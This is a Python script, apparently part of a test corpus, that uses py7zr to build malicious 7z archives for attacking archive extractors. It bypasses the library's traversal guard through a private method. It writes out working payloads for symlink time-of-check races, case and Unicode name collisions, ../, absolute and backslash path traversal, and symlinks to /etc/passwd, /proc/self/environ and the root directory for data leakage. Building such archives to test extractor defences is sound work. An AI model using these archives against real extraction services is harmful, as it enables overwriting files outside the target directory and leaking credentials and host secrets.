import os, stat, tempfile, unicodedata
import py7zr

# 7-Zip has no hard-link entry type (same as ZIP), so this mirrors the ZIP
# corpus: the symlink-collision, traversal, exfil and read-only cases — not the
# hard-link overwrite, which only tar/ can express.
#
# Two py7zr details to know:
#   * py7zr guards writestr()/writef() against absolute and ../ traversal names.
#     The private _writestr() performs the identical write without that guard,
#     which is exactly what the traversal cases need.
#   * A symlink is stored by adding a real on-disk link with write(): py7zr marks
#     it with the Unix S_IFLNK attribute and stores the link target as the entry
#     content (this is how 7-Zip encodes symlinks). 7z attributes pack the Windows
#     bits in 0..15 and the Unix st_mode in 16..31, gated by 0x8000.

UNIX_EXT = 0x8000           # FILE_ATTRIBUTE_UNIX_EXTENSION: st_mode is in bits 16..31
DOS_RDONLY = 0x01           # FILE_ATTRIBUTE_READONLY
DOS_ARCHIVE = 0x20          # FILE_ATTRIBUTE_ARCHIVE
DOS_REPARSE = 0x400         # FILE_ATTRIBUTE_REPARSE_POINT
# A 7z symlink is a file whose content is the link target, flagged S_IFLNK.
SYM_ATTR = DOS_ARCHIVE | DOS_REPARSE | UNIX_EXT | ((stat.S_IFLNK | 0o777) << 16)

_stage = tempfile.mkdtemp(prefix="7zslip-")
_seq = 0
def _staged():
    global _seq; _seq += 1
    return os.path.join(_stage, "s%d" % _seq)

def set_attr(z, attributes):     # override the 7z attribute word of the last entry
    z.header.files_info.files[-1]["attributes"] = attributes
def sym(z, name, target):        # symlink entry: store target as content, mark S_IFLNK.
    z._writestr(target.encode("utf-8"), name)   # host-independent: no on-disk link,
    set_attr(z, SYM_ATTR)                        # so any target (even /proc) works
def directory(z, name):          # an explicit directory entry (emptystream, no content)
    p = _staged(); os.mkdir(p); z.write(p, name)
def file(z, name, data=b"x"):    # a regular file (_writestr bypasses the guard,
    z._writestr(data, name)      # so ../ and absolute names survive verbatim)

# 1) cache-poisoning TOCTOU: validate d/sub, overwrite it with a symlink, write through it
with py7zr.SevenZipFile("toctou-slip.7z", "w") as z:
    directory(z, "d/sub")                      # dir (extractor validates/caches it)
    sym(z, "d/sub", "/tmp")                    # same path -> symlink out
    file(z, "d/sub/PWNED.txt")                 # write through -> /tmp/PWNED.txt

# 2) case-insensitive collision (LINK vs link)
with py7zr.SevenZipFile("case-slip.7z", "w") as z:
    sym(z, "LINK", "/tmp")
    file(z, "link/PWNED.txt")

# 3) Unicode NFC/NFD collision (café vs café)
with py7zr.SevenZipFile("unicode-slip.7z", "w") as z:
    sym(z, unicodedata.normalize("NFC", "café"), "/tmp")
    file(z, unicodedata.normalize("NFD", "café") + "/PWNED.txt")

# 4) Unicode NFKC compatibility collision (ﬁle vs file) — fools any extractor
#    that NFKC-normalizes names; NFC==NFD here, so only NFKC triggers it
with py7zr.SevenZipFile("unicode-nfkc-slip.7z", "w") as z:
    sym(z, "ﬁle", "/tmp")                      # "ﬁle" (U+FB01 fi ligature)
    file(z, "file/PWNED.txt")                  # "file" -> collides under NFKC

# 5) exfiltration: no collision, just symlinks that survive extraction. When the
#    output is later served/read, these leak arbitrary host files.
with py7zr.SevenZipFile("exfil-slip.7z", "w") as z:
    sym(z, "passwd", "/etc/passwd")
    sym(z, "env", "/proc/self/environ")
    sym(z, "root", "/")

# 6) plain ../ path traversal
with py7zr.SevenZipFile("dotdot-slip.7z", "w") as z:
    file(z, "../../../../../../tmp/PWNED.txt")

# 7) absolute path (extractor that doesn't strip a leading "/")
with py7zr.SevenZipFile("abs-slip.7z", "w") as z:
    file(z, "/tmp/PWNED.txt")

# 8) Windows backslash traversal (sanitizer that only splits on "/")
with py7zr.SevenZipFile("backslash-slip.7z", "w") as z:
    file(z, "..\\..\\..\\..\\..\\..\\tmp\\PWNED.txt")

# 9) read-only files. 0444 (Unix) and the DOS read-only attribute: `rm` prompts
#    "remove write-protected file?" and needs -f; on Windows the read-only attr
#    must be cleared first. Closest an archive gets to chattr +i — NOT enforced.
with py7zr.SevenZipFile("readonly-slip.7z", "w") as z:
    file(z, "readonly-unix.txt", b"can't rm me without -f\n")
    set_attr(z, DOS_ARCHIVE | UNIX_EXT | ((stat.S_IFREG | 0o444) << 16))
    file(z, "readonly-dos.txt", b"clear the read-only attr first\n")
    set_attr(z, DOS_ARCHIVE | DOS_RDONLY)
